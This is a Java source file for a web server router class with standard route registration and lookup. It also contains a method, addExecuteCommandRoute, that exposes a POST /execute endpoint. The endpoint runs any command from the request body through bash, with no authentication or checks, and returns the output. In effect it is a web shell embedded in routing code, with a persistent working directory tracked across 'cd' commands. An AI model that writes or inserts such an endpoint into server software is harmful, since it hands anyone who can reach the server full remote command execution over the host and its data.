package webserver;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.file.Paths;
import java.util.ArrayList;

public class WebServerRouter {
    private ArrayList<WebServerRoute> routes;
    private static String currentDirectory = System.getProperty("user.home");

    public WebServerRouter() {
        this.routes = new ArrayList<>();
    }

    public void get(String path, WebServerRouteHandler handler) {
        this.addRoute("GET", path, handler);
    }

    public void post(String path, WebServerRouteHandler handler) {
        this.addRoute("POST", path, handler);
    }

    public void put(String path, WebServerRouteHandler handler) {
        this.addRoute("PUT", path, handler);
    }

    public void delete(String path, WebServerRouteHandler handler) {
        this.addRoute("DELETE", path, handler);
    }

    private void addRoute(String method, String path, WebServerRouteHandler handler) {
        this.routes.add(new WebServerRoute(method, path, handler));
    }

    public WebServerRoute findRoute(WebServerRequest request) throws WebServerRouteNotFoundException {
        String method = request.getMethod();
        String path = request.getPath();

        for (WebServerRoute route : this.routes) {
            if (route.match(method, path))
                return route;
        }

        throw new WebServerRouteNotFoundException(method, path);
    }

    public void addExecuteCommandRoute() {
        this.post("/execute", (WebServerContext context) -> {
            WebServerRequest request = context.getRequest();
            String command = request.extractBody(CommandRequest.class).getCommand();
            String response = executeCommand(command);
            context.getResponse().ok(response);
        });
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            if (command.startsWith("cd ")) {
                String newDir = command.substring(3).trim();
                if (newDir.equals("..")) {
                    currentDirectory = Paths.get(currentDirectory).getParent().toString();
                } else {
                    currentDirectory = Paths.get(currentDirectory, newDir).toString();
                }
                output.append("Changed directory to ").append(currentDirectory).append("\n");
            } else {
                ProcessBuilder builder = new ProcessBuilder("bash", "-c", command);
                builder.directory(new java.io.File(currentDirectory));
                Process process = builder.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                reader.close();
                process.waitFor();
            }
        } catch (Exception e) {
            output.append("Error: ").append(e.getMessage());
        }
        return output.toString();
    }

    static class CommandRequest {
        private String command;

        public String getCommand() {
            return command;
        }

        public void setCommand(String command) {
            this.command = command;
        }
    }
}
